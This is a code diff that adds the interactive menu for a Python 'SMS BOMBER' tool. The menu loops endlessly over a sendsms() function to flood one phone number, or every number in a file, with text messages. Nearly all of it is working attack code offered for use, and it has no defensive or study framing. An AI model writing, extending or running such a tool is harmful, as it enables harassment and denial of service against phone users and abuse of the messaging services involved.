@@ -31,3 +31,56 @@ def sendsms(number):
         status = False
         
     return status
+
+
+def start():
+    print(b"\n SMS BOMBER")
+    print("""
+    1) Single PHONE Number   2) Combo
+""")
+    num = input("$ ")
+
+    if num == "1":
+        print("\n\nPlease Enter Number:")
+        print("Example: +989931340980\n")
+        
+        cellphone = input("SMSbomber/Singel/# ")
+        print("")
+        while True:
+            try:
+                start_sms = sendsms(cellphone)
+                
+                if start_sms == True:
+                    print("SMS Send To: "+cellphone)
+                else:
+                    print("PHONE Number This ban!")
+            except:
+                print("\nstoping process ...")
+                break
+        input("\nSMSbomber/Singel/# Back To Menu (PROCESS ENTER) ")
+    
+    elif num == "2":
+        print("\n\n Please Enter Phone Number List!!!")
+        phone_list = input("Enter the path for the list: ")
+        try:
+            phone_list = open(phone_list, mode='r').read().split()
+        
+        except FileNotFoundError:
+            print("Phone List Not Found")
+            print("Back To Menu (Press Enter) ")
+            phone_list = []
+            
+        print("")
+
+        while True:
+            try:
+                if not len(phone_list) == 0:
+                    for number in phone_list:
+                        start_sms = sendsms(number)
+
+                        if start_sms == True:
+                            print("Sms Send To: "+ number)
+                        else:
+                            print("cannot able to find the {number}")
+                else:
+                    break
